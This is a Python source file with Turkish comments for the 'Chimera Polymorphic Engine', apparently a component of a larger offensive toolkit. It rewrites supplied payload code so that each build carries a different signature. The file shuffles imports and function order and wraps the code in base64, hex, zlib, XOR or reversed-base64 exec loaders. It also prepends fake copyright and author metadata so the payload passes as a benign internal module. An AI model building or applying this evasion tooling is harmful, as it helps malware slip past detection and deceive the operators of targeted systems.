"""
Chimera Polymorphic Engine - Polimorfik Payload Üretici

Her build'de farklı imza üreten payload dönüşüm motoru.
Obfuscation'dan farklı olarak, polimorfik engine kodun
yapısal düzenini değiştirir:

    1. Import sırasını karıştırır
    2. Fonksiyon/sınıf tanım sırasını karıştırır
    3. Farklı encoding wrapper'ları uygular
    4. Rastgele decoy metadata ekler
    5. Entry point stub'ını çeşitlendirir

Kullanım:
    from build.chimera_polymorphic import polymorphic_wrap

    result = polymorphic_wrap(source_code, seed=None)
    # result = {"success": True, "code": "...", "mutations": [...], "error": None}
"""

import ast
import random
import string
import base64
import zlib
import hashlib
import textwrap
import time
from typing import Optional


# ============================================================
# Yardımcı Fonksiyonlar
# ============================================================

def _rand_id(prefix: str = "_P", length: int = 8) -> str:
    """Rastgele benzersiz tanımlayıcı üretir."""
    chars = string.ascii_letters + string.digits
    body = "".join(random.choices(chars, k=length))
    first = random.choice(string.ascii_letters)
    return prefix + first + body


def _rand_string(min_len: int = 8, max_len: int = 24) -> str:
    """Rastgele alfanumerik string üretir."""
    length = random.randint(min_len, max_len)
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


# ============================================================
# Mutasyon 1: Import Sırasını Karıştırma
# ============================================================

def _shuffle_imports(source: str) -> tuple:
    """Import ifadelerinin sırasını rastgele değiştirir.
    
    Bağımlılık sırası korunur (from X import Y, import X ayrı gruplar).
    
    Returns:
        (mutated_source: str, applied: bool)
    """
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return source, False

    imports = []
    from_imports = []
    other_stmts = []
    import_indices = []

    for i, node in enumerate(tree.body):
        if isinstance(node, ast.Import):
            imports.append(node)
            import_indices.append(i)
        elif isinstance(node, ast.ImportFrom):
            from_imports.append(node)
            import_indices.append(i)
        else:
            other_stmts.append((i, node))

    if len(imports) + len(from_imports) < 2:
        return source, False

    # Her grubu kendi içinde karıştır
    random.shuffle(imports)
    random.shuffle(from_imports)

    # Yeni body: önce imports, sonra from imports, sonra diğerleri
    # Ama orijinal yerlerini korumak yerine en başa topluyoruz
    new_body = imports + from_imports
    for _, node in sorted(other_stmts, key=lambda x: x[0]):
        new_body.append(node)

    tree.body = new_body
    ast.fix_missing_locations(tree)

    try:
        result = ast.unparse(tree)
        ast.parse(result)
        return result, True
    except SyntaxError:
        return source, False


# ============================================================
# Mutasyon 2: Fonksiyon/Sınıf Sırasını Karıştırma
# ============================================================

def _shuffle_definitions(source: str) -> tuple:
    """Üst düzey fonksiyon ve sınıf tanımlarının sırasını karıştırır.
    
    Sadece birbirine bağımlılığı olmayan tanımları karıştırır.
    Import'ları, __main__ bloğunu ve sıra-bağımlı ifadeleri korur.
    
    Returns:
        (mutated_source: str, applied: bool)
    """
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return source, False

    # Her node'un orijinal sırasını koru
    indexed_nodes = list(enumerate(tree.body))
    
    # Tanımlanmış isimleri ve bağımlılıklarını bul
    defined_names = {}  # name -> index
    node_deps = {}      # index -> set of names it references
    
    for idx, node in indexed_nodes:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            defined_names[node.name] = idx
        elif isinstance(node, ast.ClassDef):
            defined_names[node.name] = idx
    
    # Sadece sınıf/fonksiyon tanımlarını ve karıştırılabilir olanları bul
    # Bağımsız tanımları karıştır, diğerlerini yerinde bırak
    shuffleable_indices = []
    
    for idx, node in indexed_nodes:
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            # Bu tanım başka bir tanıma decorator veya base class olarak bağımlı mı?
            # Basit yaklaşım: sadece sınıf ve fonksiyon tanımlarını topla
            # Bağımlılık analizi yerine, sınıfları yerinde bırak (base class referansları)
            # ve sadece fonksiyonları karıştır
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                shuffleable_indices.append(idx)
    
    if len(shuffleable_indices) < 2:
        return source, False
    
    # Karıştırılacak fonksiyonları al
    shuffleable_nodes = [tree.body[i] for i in shuffleable_indices]
    random.shuffle(shuffleable_nodes)
    
    # Yeni body: orijinal sıra korunur, sadece fonksiyonlar karıştırılır
    new_body = list(tree.body)
    for i, orig_idx in enumerate(shuffleable_indices):
        new_body[orig_idx] = shuffleable_nodes[i]
    
    tree.body = new_body
    ast.fix_missing_locations(tree)

    try:
        result = ast.unparse(tree)
        ast.parse(result)
        return result, True
    except SyntaxError:
        return source, False


# ============================================================
# Mutasyon 3: Encoding Wrapper (Payload Sarmalama)
# ============================================================

_WRAPPER_TEMPLATES = {
    "base64": '''
import base64 as _b64
exec(_b64.b64decode({encoded!r}).decode("utf-8"))
''',

    "hex": '''
exec(bytes.fromhex({encoded!r}).decode("utf-8"))
''',

    "zlib_b64": '''
import base64 as _b64
import zlib as _z
exec(_z.decompress(_b64.b64decode({encoded!r})).decode("utf-8"))
''',

    "xor_b64": '''
import base64 as _b64
_k = {key}
_d = _b64.b64decode({encoded!r})
exec(bytes([_b ^ _k for _b in _d]).decode("utf-8"))
''',

    "reverse_b64": '''
import base64 as _b64
exec(_b64.b64decode({encoded!r}[::-1]).decode("utf-8"))
''',
}


def _apply_encoding_wrapper(source: str) -> tuple:
    """Kaynak kodu rastgele bir encoding yöntemi ile sarmalayarak çalıştırır.
    
    Returns:
        (wrapped_source: str, wrapper_name: str)
    """
    wrapper_name = random.choice(list(_WRAPPER_TEMPLATES.keys()))
    source_bytes = source.encode("utf-8")

    if wrapper_name == "base64":
        encoded = base64.b64encode(source_bytes).decode("ascii")
        code = _WRAPPER_TEMPLATES["base64"].format(encoded=encoded)

    elif wrapper_name == "hex":
        encoded = source_bytes.hex()
        code = _WRAPPER_TEMPLATES["hex"].format(encoded=encoded)

    elif wrapper_name == "zlib_b64":
        compressed = zlib.compress(source_bytes, level=9)
        encoded = base64.b64encode(compressed).decode("ascii")
        code = _WRAPPER_TEMPLATES["zlib_b64"].format(encoded=encoded)

    elif wrapper_name == "xor_b64":
        key = random.randint(1, 254)
        xored = bytes([b ^ key for b in source_bytes])
        encoded = base64.b64encode(xored).decode("ascii")
        code = _WRAPPER_TEMPLATES["xor_b64"].format(encoded=encoded, key=key)

    elif wrapper_name == "reverse_b64":
        encoded = base64.b64encode(source_bytes).decode("ascii")[::-1]
        code = _WRAPPER_TEMPLATES["reverse_b64"].format(encoded=encoded)

    else:
        return source, "none"

    return code.strip(), wrapper_name


# ============================================================
# Mutasyon 4: Decoy Metadata (Sahte Dosya Bilgisi)
# ============================================================

_DECOY_NAMES = [
    "config_manager", "utils_helper", "db_connector", "api_client",
    "cache_handler", "log_manager", "auth_service", "data_processor",
    "task_scheduler", "event_handler", "file_manager", "queue_worker",
    "session_manager", "notification_service", "metrics_collector",
]

_DECOY_AUTHORS = [
    "Development Team", "System Admin", "Backend Services",
    "Infrastructure", "Platform Engineering", "DevOps Team",
]


def _add_decoy_metadata(source: str) -> tuple:
    """Kaynak kodun başına sahte metadata docstring/değişkenleri ekler.
    
    Returns:
        (mutated_source: str, applied: bool)
    """
    name = random.choice(_DECOY_NAMES)
    author = random.choice(_DECOY_AUTHORS)
    version = f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 99)}"
    year = random.randint(2022, 2026)

    # Docstring
    docstring = f'"""\n{name.replace("_", " ").title()} Module v{version}\n'
    docstring += f'Copyright (c) {year} {author}\n'
    docstring += f'Internal use only. All rights reserved.\n"""\n\n'

    # Sahte metadata değişkenleri
    meta_vars = f'__version__ = "{version}"\n'
    meta_vars += f'__author__ = "{author}"\n'
    meta_vars += f'__module_name__ = "{name}"\n\n'

    return docstring + meta_vars + source, True


# ============================================================
# Mutasyon 5: Entry Point Stub Çeşitlendirme
# ============================================================

_STUB_TEMPLATES = [
    # Basit exec
    'exec(compile({code_var}, "<module>", "exec"))',
    
    # Eval + exec birleşimi
    '(lambda: exec(compile({code_var}, "<{mod_name}>", "exec")))()',
    
    # types modülü ile
    'import types as _t; _m = _t.ModuleType("{mod_name}"); exec(compile({code_var}, "<{mod_name}>", "exec"), _m.__dict__)',
]


def _wrap_with_stub(source: str) -> tuple:
    """Kaynak kodu farklı bir çalıştırma stub'ı ile sarar.
    
    Returns:
        (wrapped_source: str, stub_type: str)
    """
    # Kodu base64 olarak kodla
    encoded = base64.b64encode(source.encode("utf-8")).decode("ascii")
    code_var = _rand_id("_c", 6)
    mod_name = random.choice(_DECOY_NAMES)
    
    # Decode satırı
    decode_line = f'import base64 as _b\n{code_var} = _b.b64decode("{encoded}").decode("utf-8")\n'
    
    # Stub seç
    stub_idx = random.randint(0, len(_STUB_TEMPLATES) - 1)
    stub = _STUB_TEMPLATES[stub_idx].format(code_var=code_var, mod_name=mod_name)
    
    return decode_line + stub + "\n", f"stub_{stub_idx}"


# ============================================================
# Ana Polimorfik Engine
# ============================================================

def polymorphic_wrap(
    source: str,
    seed: Optional[int] = None,
    shuffle_imports: bool = True,
    shuffle_defs: bool = True,
    encoding_wrapper: bool = True,
    decoy_metadata: bool = True,
    entry_stub: bool = False,
) -> dict:
    """Kaynak koda polimorfik mutasyonlar uygular.
    
    Her çağrıda (farklı seed ile) farklı bir payload imzası üretir.
    
    Args:
        source:           Ham Python kaynak kodu.
        seed:             RNG seed (None ise mevcut zaman kullanılır).
        shuffle_imports:  Import sırasını karıştır.
        shuffle_defs:     Fonksiyon/sınıf sırasını karıştır.  
        encoding_wrapper: Encoding wrapper uygula.
        decoy_metadata:   Sahte metadata ekle.
        entry_stub:       Entry point stub çeşitlendir.

    Returns:
        dict:
            - success (bool)    : İşlem başarılı mı?
            - code (str)        : Polimorfik payload kodu.
            - mutations (list)  : Uygulanan mutasyonlar listesi.
            - error (str|None)  : Hata mesajı.
    """
    if seed is None:
        seed = int(time.time() * 1000) & 0xFFFFFFFF
    random.seed(seed)

    result = {
        "success": False,
        "code": source,
        "mutations": [],
        "error": None,
    }

    current = source

    # 1. Import sırasını karıştır
    if shuffle_imports:
        try:
            current, applied = _shuffle_imports(current)
            if applied:
                result["mutations"].append("import_shuffle")
        except Exception as e:
            pass  # Hata olursa atla, devam et

    # 2. Fonksiyon/sınıf sırasını karıştır
    if shuffle_defs:
        try:
            current, applied = _shuffle_definitions(current)
            if applied:
                result["mutations"].append("definition_shuffle")
        except Exception:
            pass

    # 3. Decoy metadata ekle (encoding'den önce, çünkü encoding tüm kodu sarar)
    if decoy_metadata:
        try:
            current, applied = _add_decoy_metadata(current)
            if applied:
                result["mutations"].append("decoy_metadata")
        except Exception:
            pass

    # 4. Encoding wrapper uygula
    if encoding_wrapper:
        try:
            current, wrapper_name = _apply_encoding_wrapper(current)
            result["mutations"].append(f"encoding:{wrapper_name}")
        except Exception as e:
            result["error"] = f"[!] Encoding wrapper hatası: {e}"
            return result

    # 5. Entry point stub (encoding ile birlikte kullanılmaz)
    elif entry_stub:
        try:
            current, stub_type = _wrap_with_stub(current)
            result["mutations"].append(f"stub:{stub_type}")
        except Exception:
            pass

    # Doğrulama
    try:
        compile(current, "<polymorphic>", "exec")
    except SyntaxError as e:
        result["error"] = f"[!] Polimorfik çıktı syntax hatası: {e}"
        return result

    result["success"] = True
    result["code"] = current
    return result


def print_polymorphic_report(result: dict):
    """Polimorfik dönüşüm raporunu ekrana basar."""
    if not result["success"]:
        print(f"\n  {result['error']}\n")
        return

    border = "═" * 58

    print(f"\n  ╔{border}╗")
    print(f"  ║  🧬  CHIMERA POLYMORPHIC ENGINE - Rapor                ║")
    print(f"  ╠{border}╣")
    print(f"  ║  Durum       : ✅ Başarılı                              ║")
    print(f"  ╠{border}╣")
    print(f"  ║  🔀 Uygulanan Mutasyonlar                               ║")

    for mut in result["mutations"]:
        print(f"  ║  ├─ {mut:<53}║")

    if not result["mutations"]:
        print(f"  ║  └─ (Mutasyon uygulanmadı)                              ║")

    print(f"  ╚{border}╝\n")
